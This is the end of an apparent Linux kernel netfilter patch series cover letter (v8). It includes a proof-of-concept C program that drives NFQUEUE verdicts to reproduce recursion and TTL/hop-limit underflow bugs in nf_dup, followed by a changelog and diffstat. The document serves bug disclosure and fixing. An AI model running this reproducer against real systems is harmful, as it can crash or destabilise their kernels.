+    else if (!strcmp(mode, "drop")) { verdict = NF_DROP; drops++; }
+    else if (!strcmp(mode, "stop")) verdict = NF_STOP;
+    int rv = nfq_set_verdict(qh, id, verdict, 0, NULL);
+    if (rv >= 0) verdict_ok++;
+    else verdict_fail++;
+    return 0;
+}
+int main(int argc, char **argv)
+{
+    int seconds = argc > 1 ? atoi(argv[1]) : 3;
+    signal(SIGALRM, alarm_handler); alarm(seconds);
+    int family = argc > 2 && atoi(argv[2]) == 6 ? AF_INET6 : AF_INET;
+    if (argc > 2 && atoi(argv[2]) == 7) family = 7;
+    if (argc > 3) mode = argv[3];
+    struct nfq_handle *h = nfq_open();
+    if (!h) { perror("nfq_open"); return 1; }
+    if (nfq_unbind_pf(h, family) < 0) perror("nfq_unbind_pf");
+    if (nfq_bind_pf(h, family) < 0) { perror("nfq_bind_pf"); return 2; }
+    queue = nfq_create_queue(h, 0, cb, NULL);
+    if (!queue) { perror("nfq_create_queue"); return 3; }
+    if (!strcmp(mode, "slow") && nfq_set_queue_maxlen(queue, 1) < 0) { perror("nfq_set_queue_maxlen"); return 4; }
+    if (nfq_set_mode(queue, NFQNL_COPY_PACKET, 0xffff) < 0) { perror("nfq_set_mode"); return 4; }
+    int fd = nfq_fd(h); char buf[65536];
+    while (!stop) {
+        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
+        if (n >= 0) { nfq_handle_packet(h, buf, n); continue; }
+        if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1000); continue; }
+        if (errno == EINTR) continue;
+        perror("recv"); break;
+    }
+    printf("callbacks=%lu verdict_ok=%lu verdict_fail=%lu repeat=%lu drop=%lu", callbacks, verdict_ok, verdict_fail, repeats, drops);
+    nfq_destroy_queue(queue); nfq_close(h);
+    return verdict_fail ? 5 : 0;
+}
+
+------END poc.c--------
+
+Changes in v8:
+  - split the v7 NFQUEUE/netdev proposal into focused patches and add a
+    third patch for the ingress TTL/hop-limit limit
+  - preserve the IPv4/IPv6 recursion guard across NFQUEUE reinjection
+  - bound netdev dup depth across software skb/XDP paths
+  - stop IPv4 TTL and IPv6 hop-limit underflow before cloning
+  - limit the netdev claim to software skb/XDP paths and document the
+    MIRRED offload restriction
+  - v7 Link:
+    https://lore.kernel.org/all/cover.1791688819.git.zihanx@nebusec.ai/
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (3):
+  netfilter: nf_dup: preserve guard across NFQUEUE reinjection
+  netfilter: nf_dup_netdev: bound asynchronous duplication
+  netfilter: nf_dup: prevent TTL and hop-limit underflow
+
+ drivers/net/veth.c               |  3 +++
+ drivers/net/virtio_net.c         |  3 +++
+ include/linux/skbuff.h           |  9 +++++++++
+ include/net/libeth/xdp.h         |  6 ++++--
+ include/net/netfilter/nf_queue.h |  1 +
+ include/net/xdp.h                | 25 +++++++++++++++++++++++++
+ net/core/gro.c                   |  3 +++
+ net/core/xdp.c                   | 10 ++++++++++
+ net/ipv4/netfilter/nf_dup_ipv4.c |  3 +++
+ net/ipv6/netfilter/nf_dup_ipv6.c |  3 +++
+ net/netfilter/nf_dup_netdev.c    | 11 ++++++++++-
+ net/netfilter/nf_queue.c         |  1 +
+ net/netfilter/nfnetlink_queue.c  | 15 ++++++++++++---
+ net/xdp/xsk_buff_pool.c          |  2 ++
+ 14 files changed, 89 insertions(+), 6 deletions(-)
+
+-- 
+2.43.0
 
